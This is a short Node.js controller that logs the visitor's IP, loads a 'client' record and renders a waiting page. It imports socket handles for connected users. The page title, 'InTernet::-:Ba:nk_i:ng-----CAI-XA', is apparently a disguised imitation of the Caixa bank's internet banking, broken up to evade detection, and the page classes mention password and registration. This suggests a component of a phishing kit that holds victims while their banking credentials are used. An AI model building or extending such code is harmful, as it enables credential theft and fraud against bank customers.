const Client = require('../../models/Client')
const { clientsSocket, connectedUsers } = require('../../server')

module.exports = {
    async view(req, res) {
        try {
            //Client
            const ipfromUser = req.connection.remoteAddress

            const { client } = req.query

            const theClient = await Client.findByPk(client)

            return res.render('await', {
                title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA',
                pageClasses: 'password cadastro',
                client: theClient.toJSON(),
                await: true,
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
